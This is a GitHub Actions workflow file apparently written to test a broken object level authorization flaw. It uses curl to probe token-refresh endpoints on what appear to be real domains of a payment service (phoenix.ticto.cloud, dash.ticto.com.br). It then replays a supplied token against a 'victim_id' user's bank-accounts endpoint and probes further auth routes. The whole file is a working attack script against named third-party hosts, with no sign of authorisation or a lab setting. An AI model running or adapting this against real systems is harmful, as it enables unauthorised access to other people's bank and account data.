name: bola
on:
  workflow_dispatch:
    inputs:
      refresh_token:
        required: true
        description: 'Refresh token to get new access token'
      victim_id:
        required: true
        default: '101'
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Refresh token
        id: refresh
        run: |
          echo "=== Trying refresh token endpoints ==="
          for ep in \
            "https://phoenix.ticto.cloud/api/v1/auth/refresh" \
            "https://phoenix.ticto.cloud/api/v1/refresh-token" \
            "https://phoenix.ticto.cloud/api/auth/refresh" \
            "https://phoenix.ticto.cloud/sanctum/token" \
            "https://dash.ticto.com.br/api/v1/auth/refresh-token" \
            "https://dash.ticto.com.br/api/v1/auth/token/refresh" ; do
            echo "--- $ep ---"
            curl -sk -w "\nHTTP:%{http_code}\n" -X POST "$ep" \
              -H "Content-Type: application/json" \
              -d "{\"token\": \"${{ inputs.refresh_token }}\", \"refresh_token\": \"${{ inputs.refresh_token }}\"}"
          done
      - name: Try bearer with refresh token directly
        run: |
          echo "=== Use refresh token as Bearer ==="
          curl -sk -w "\nHTTP:%{http_code}\n" \
            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.victim_id }}/manage/bank-accounts" \
            -H "Authorization: Bearer ${{ inputs.refresh_token }}" \
            -H "Accept: application/json"
      - name: Probe phoenix auth endpoints
        run: |
          echo "=== Probe what phoenix has ==="
          for path in /api/v1/auth /api/v1/private/user /api/v1/user /api/v1/me; do
            echo "--- $path ---"
            curl -sk -w "\nHTTP:%{http_code}\n" \
              "https://phoenix.ticto.cloud$path" \
              -H "Authorization: Bearer ${{ inputs.refresh_token }}" \
              -H "Accept: application/json"
          done
